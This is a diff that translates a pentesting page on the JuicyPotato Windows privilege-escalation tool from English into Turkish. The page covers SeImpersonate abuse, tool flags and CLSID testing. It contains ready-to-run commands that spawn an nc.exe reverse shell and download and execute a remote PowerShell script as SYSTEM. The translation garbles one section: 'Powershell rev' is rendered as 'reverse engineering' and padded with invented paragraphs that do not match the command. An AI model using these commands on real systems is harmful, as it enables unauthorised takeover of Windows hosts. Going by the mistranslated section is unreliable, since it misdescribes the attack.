@@ -2,67 +2,66 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
+* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile göndererek paylaşın**.
 
 </details>
 
 {% hint style="warning" %}
-**JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. _**Check:**_
+**JuicyPotato**, Windows Server 2019 ve Windows 10 sürüm 1809'dan itibaren çalışmamaktadır. Bununla birlikte, **PrintSpoofer**, **RoguePotato**, **SharpEfsPotato** aynı yetkileri kullanarak ve `NT AUTHORITY\SYSTEM` düzeyinde erişim sağlamak için kullanılabilir. _**Kontrol edin:**_
 {% endhint %}
 
 {% content-ref url="roguepotato-and-printspoofer.md" %}
 [roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
 {% endcontent-ref %}
 
-## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
+## Juicy Potato (altın yetkileri kötüye kullanma) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
 
-_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_
+_Biraz meyve suyu eklenmiş_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_'nun tatlandırılmış bir versiyonu, yani **Windows Hizmet Hesaplarından NT AUTHORITY\SYSTEM'e yerel ayrıcalık yükseltme aracı**_
 
-#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)
+#### Juicypotato'yı [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) adresinden indirebilirsiniz.
 
-### Summary <a href="#summary" id="summary"></a>
+### Özet <a href="#summary" id="summary"></a>
 
-**[From juicy-potato Readme](https://github.com/ohpe/juicy-potato/blob/master/README.md):**
+**[Juicy-potato Readme'den](https://github.com/ohpe/juicy-potato/blob/master/README.md):**
 
-[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) ve [varyantları](https://github.com/decoder-it/lonelypotato), [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [hizmeti](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) temelindeki ayrıcalık yükseltme zincirini kullanır ve `SeImpersonate` veya `SeAssignPrimaryToken` ayrıcalıklarına sahip olduğunuzda `127.0.0.1:6666` üzerinde MiTM dinleyiciye sahiptir. Bir Windows derleme incelemesi sırasında, `BITS`'in kasıtlı olarak devre dışı bırakıldığı ve `6666` numaralı bağlantı noktasının alındığı bir yapı bulduk.
 
-We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)'yi silahlandırmaya karar verdik: **Juicy Potato'ya merhaba deyin**.
 
-> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.
+> Teori için [Rotten Potato - Hizmet Hesaplarından SYSTEM'e Ayrıcalık Yükseltme](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) makalesine bakın ve bağlantılar ve referanslar zincirini takip edin.
 
-We discovered that, other than `BITS` there are a several COM servers we can abuse. They just need to:
+`BITS` dışında, kullanabileceğimiz birkaç COM sunucusu olduğunu keşfettik. Bunlar sadece:
 
-1. be instantiable by the current user, normally a “service user” which has impersonation privileges
-2. implement the `IMarshal` interface
-3. run as an elevated user (SYSTEM, Administrator, …)
+1. mevcut kullanıcı tarafından anında oluşturulabilir, genellikle bir "hizmet kullanıcısı" olan ve taklit yetkilerine sahip olan
+2. `IMarshal` arabirimini uygulayabilir
+3. yükseltilmiş bir kullanıcı olarak çalışabilir (SYSTEM, Yönetici, ...)
 
-After some testing we obtained and tested an extensive list of [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) on several Windows versions.
+Bazı testlerden sonra, çeşitli Windows sürümlerindeki [ilginç CLSID'lerin](http://ohpe.it/juicy-potato/CLSID/) kapsamlı bir listesini elde ettik ve test ettik.
 
-### Juicy details <a href="#juicy-details" id="juicy-details"></a>
+### Detaylar <a href="#juicy-details" id="juicy-details"></a>
 
-JuicyPotato allows you to:
+JuicyPotato ile şunları yapabilirsiniz:
 
-* **Target CLSID** _pick any CLSID you want._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _you can find the list organized by OS._
-* **COM Listening port** _define COM listening port you prefer (instead of the marshalled hardcoded 6666)_
-* **COM Listening IP address** _bind the server on any IP_
-* **Process creation mode** _depending on the impersonated user’s privileges you can choose from:_
-  * `CreateProcessWithToken` (needs `SeImpersonate`)
-  * `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
-  * `both`
-* **Process to launch** _launch an executable or script if the exploitation succeeds_
-* **Process Argument** _customize the launched process arguments_
-* **RPC Server address** _for a stealthy approach you can authenticate to an external RPC server_
-* **RPC Server port** _useful if you want to authenticate to an external server and firewall is blocking port `135`…_
-* **TEST mode** _mainly for testing purposes, i.e. testing CLSIDs. It creates the DCOM and prints the user of token. See_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)
+* **Hedef CLSID** _istediğiniz herhangi bir CLSID'yi seçin._ [_Burada_](http://ohpe.it/juicy-potato/CLSID/) _OS'ye göre düzenlenmiş listeyi bulabilirsiniz._
+* **COM Dinleme bağlantı noktası** _sabitlenmiş 6666 yerine tercih ettiğiniz COM dinleme bağlantı noktasını tanımlayın_
+* **COM Dinleme IP adresi** _sunucuyu herhangi bir IP'ye bağlayın_
+* **Proses oluşturma modu** _taklit edilen kullanıcının ayrıcalıklarına bağlı olarak aşağıdakilerden seçim yapabilirsiniz:_
+* `CreateProcessWithToken` (`SeImpersonate` gerektirir)
+* `CreateProcessAsUser` (`SeAssignPrimaryToken` gerektirir)
+* `her ikisi`
+* **Başlatılacak Proses** _saldırı başarılı olduğunda bir yürütülebilir veya komut dosyası başlatın_
+* **Proses Argümanı** _başlatılan işlem argümanlarını özelleştirin_
+* **RPC Sunucusu adresi** _gizli bir yaklaşım için harici bir RPC sunucusuna kimlik doğrulayabilirsiniz_
+* **RPC Sunucusu bağlantı noktası** _eğer harici bir sunucuya kimlik doğrulamak istiyorsanız ve güvenlik duvarı port `135`'i engelliyorsa işe yarar..._
+* **TEST modu** _çoğunlukla test amaçlıdır, yani CLSID'leri test etmek için. DCOM'u oluşturur ve token'ın kullanıcısını yazdırır. Test için_ [_buraya bakın_](http://ohpe.it/juicy-potato/Test/)
 
-### Usage <a href="#usage" id="usage"></a>
-
+### Kullanım <a href="#usage" id="usage"></a>
 ```
 T:\>JuicyPotato.exe
 JuicyPotato v0.1
@@ -79,25 +78,23 @@ Optional args:
 -k <ip>: RPC server ip address (default 127.0.0.1)
 -n <port>: RPC server listen port (default 135)
 ```
+### Son düşünceler <a href="#final-thoughts" id="final-thoughts"></a>
 
-### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>
+**[Juicy-potato Readme'den](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**
 
-**[From juicy-potato Readme](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**
+Eğer kullanıcının `SeImpersonate` veya `SeAssignPrimaryToken` yetkileri varsa, o zaman **SYSTEM** olursunuz.
 
-If the user has `SeImpersonate` or `SeAssignPrimaryToken` privileges then you are **SYSTEM**.
+Tüm bu COM Sunucularının kötüye kullanılmasını engellemek neredeyse imkansızdır. Bu nesnelerin izinlerini `DCOMCNFG` aracılığıyla değiştirmeyi düşünebilirsiniz, ama iyi şanslar, bu zor olacak.
 
-It’s nearly impossible to prevent the abuse of all these COM Servers. You could think about modifying the permissions of these objects via `DCOMCNFG` but good luck, this is gonna be challenging.
+Gerçek çözüm, `* SERVICE` hesapları altında çalışan hassas hesapları ve uygulamaları korumaktır. `DCOM`'u durdurmak bu saldırıyı kesinlikle engeller, ancak altta yatan işletim sistemi üzerinde ciddi bir etkisi olabilir.
 
-The actual solution is to protect sensitive accounts and applications which run under the `* SERVICE` accounts. Stopping `DCOM` would certainly inhibit this exploit but could have a serious impact on the underlying OS.
+Kaynak: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
-From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
+## Örnekler
 
-## Examples
+Not: Denemek için CLSID'lerin bir listesi için [bu sayfayı](https://ohpe.it/juicy-potato/CLSID/) ziyaret edin.
 
-Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.
-
-### Get a nc.exe reverse shell
-
+### Bir nc.exe ters kabuk alın
 ```
 c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
 
@@ -110,44 +107,49 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 
 c:\Users\Public>
 ```
+### Powershell tersine mühendislik
 
-### Powershell rev
+Bu bölümde, Powershell tersine mühendislik tekniklerini ele alacağız. Powershell, Windows işletim sistemlerinde kullanılan bir betikleme dilidir ve sıklıkla siber saldırganlar tarafından hedef sistemlere erişim sağlamak için kullanılır.
 
+Powershell tersine mühendislik, bir Powershell betiğini analiz etmek ve içindeki işlevleri, değişkenleri ve komutları anlamak için kullanılan bir yöntemdir. Bu, saldırganların hedef sisteme zararlı kod enjekte etmek veya hassas bilgilere erişmek için kullanabileceği bir yetenektir.
+
+Powershell tersine mühendislik teknikleri, Powershell betiğinin çalışma mantığını anlamak, kodu analiz etmek ve potansiyel güvenlik açıklarını tespit etmek için kullanılır. Bu teknikler, saldırganların hedef sistemdeki zayıf noktaları tespit etmelerine ve daha sonra bu zayıf noktaları kullanarak hedef sistemdeki ayrıcalıkları yükseltmelerine olanak tanır.
+
+Powershell tersine mühendislik, siber güvenlik uzmanları ve pentester'lar tarafından kullanılan bir beceridir. Bu teknikleri kullanarak, saldırganlar hedef sistemdeki güvenlik açıklarını tespit edebilir ve bu açıkları kullanarak hedef sistemdeki ayrıcalıkları yükseltebilir. Bu nedenle, siber güvenlik uzmanlarının ve sistem yöneticilerinin Powershell tersine mühendislik tekniklerine karşı savunma mekanizmaları geliştirmeleri önemlidir.
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
-
-### Launch a new CMD (if you have RDP access)
+### Yeni bir CMD başlatın (RDP erişiminiz varsa)
 
 ![](<../../.gitbook/assets/image (37).png>)
 
-## CLSID Problems
+## CLSID Sorunları
 
-Oftentimes, the default CLSID that JuicyPotato uses **doesn't work** and the exploit fails. Usually, it takes multiple attempts to find a **working CLSID**. To get a list of CLSIDs to try for a specific operating system, you should visit this page:
+Genellikle, JuicyPotato'nun kullandığı varsayılan CLSID **çalışmaz** ve saldırı başarısız olur. Genellikle, **çalışan bir CLSID** bulmak için birden fazla deneme yapmak gerekmektedir. Belirli bir işletim sistemi için denemek için CLSID listesine ihtiyacınız varsa, bu sayfayı ziyaret etmelisiniz:
 
 {% embed url="https://ohpe.it/juicy-potato/CLSID/" %}
 
-### **Checking CLSIDs**
+### **CLSIDs'i Kontrol Etme**
 
-First, you will need some executables apart from juicypotato.exe.
+İlk olarak, juicypotato.exe dışında bazı yürütülebilir dosyalara ihtiyacınız olacak.
 
-Download [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) and load it into your PS session, and download and execute [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). That script will create a list of possible CLSIDs to test.
+[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)'i indirin ve PS oturumunuza yükleyin, [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)'i indirin ve çalıştırın. Bu komut dosyası, test etmek için olası CLSID'lerin bir listesini oluşturacaktır.
 
-Then download [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(change the path to the CLSID list and to the juicypotato executable) and execute it. It will start trying every CLSID, and **when the port number changes, it will mean that the CLSID worked**.
+Ardından [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)'ı indirin (CLSİD listesinin yolunu ve juicypotato yürütülebilir dosyasının yolunu değiştirin) ve çalıştırın. Her CLSID'yi denemeye başlayacak ve **port numarası değiştiğinde, CLSID'nin çalıştığı anlamına gelecektir**.
 
-**Check** the working CLSIDs **using the parameter -c**
+**Çalışan CLSİD'leri** -c parametresini kullanarak **kontrol edin**
 
-## References
+## Referanslar
 * [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme hakkında sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne erişim sağlamak veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **göndererek paylaşın**.
 
 </details>
